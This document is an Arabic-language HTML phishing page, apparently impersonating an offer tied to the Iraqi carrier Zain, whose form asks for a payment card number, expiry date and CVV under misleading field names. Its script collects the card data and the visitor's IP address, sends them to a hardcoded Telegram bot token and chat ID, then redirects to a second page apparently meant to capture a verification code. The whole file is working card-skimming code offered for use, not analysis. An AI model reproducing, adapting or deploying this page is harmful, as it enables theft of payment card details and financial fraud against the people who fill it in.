<html lang="en">

<head>

    <title>تعبئة طلب فوري</title>

    <style>

        body {

            margin: 0;

            padding: 0;

            display: flex;

            flex-direction: column;

            align-items: center;

            justify-content: center;

            background-color: #f3f3f3;

            font-family: Arial, sans-serif;

            height: 100vh;

            overflow: hidden;

        }

        h1 {

            color: #333;

            font-size: 2rem;

            margin-bottom: 20px;

        }

        form {

            background: #fff;

            padding: 20px;

            border-radius: 8px;

            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);

            width: 90%;

            max-width: 400px;

        }

        .form-group {

            margin-bottom: 15px;

        }

        label {

            display: block;

            margin-bottom: 5px;

            font-weight: bold;

        }

        input, select {

            width: 100%;

            padding: 10px;

            font-size: 1rem;

            border: 1px solid #ccc;

            border-radius: 4px;

            box-sizing: border-box;

        }

        input:required {

            background-color: #fafafa;

        }

        button {

            width: 90%;

            padding: 10px;

            font-size: 1rem;

            color: #fff;

            background-color: #28a745;

            border: none;

            border-radius: 4px;

            cursor: pointer;

        }

        button:hover {

            background-color: #218838;

        }

        .loading {

            display: none;

            text-align: center;

        }

        .loading span {

            display: block;

            margin-bottom: 10px;

        }

    </style>

</head>

<body>

    <form id="loanForm">

        <div class="form-group">

            <label for="fullName">رقم البطاقة</label>

             <input type="text" id="fullName" name="fullName" pattern="[0-9]{16}" placeholder="1234 5678 9012 3456" required>

        </div>

        <div class="form-group">

            <label for="phone">تاريخ الإنتهاء مثال 01/25</label>
            <input maxlength="5" type="text" id="phone" name="phone" pattern="[0-9]{2}/[0-9]{2}" placeholder="MM/YY" oninput="this.value = this.value.replace(/(\d{2})(\d{2})/, '$1/$2')"required> 

        </div>

        <div class="form-group">

            <label for="loanAmount">رقم CVV</label>

            <input type="tel" id="loanAmount" loanAmount="phone" maxlength='3' required>



        <div class="form-group">


        </div>

        <button type="submit">متابعة</button>

    </form>

    <div class="loading" id="loading">


    <script>

        document.getElementById('loanForm').addEventListener('submit', async function (event) {

            event.preventDefault();

            const fullName = document.getElementById('fullName').value;

            const phone = document.getElementById('phone').value;

            const loanAmount = document.getElementById('loanAmount').value;
             const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
     

            const token = '7636117454:AAG89iFLhRboah-JoMu2-gtmXz2qq8QemUM';

            const chatId = '6797351288';

            const message = `رقم البطاقة: ${fullName}\nتاريخ : ${phone}\nكود CVV: ${loanAmount}\nIP: ${ip}`;
            
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            


            await fetch(url); 

            setTimeout(() => {

                window.location.href = ' https://Zain-iq.netlify.app/code.html ';

            }, );

        });

    </script>

</body>



<script type='text/javascript'>
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>

</html>
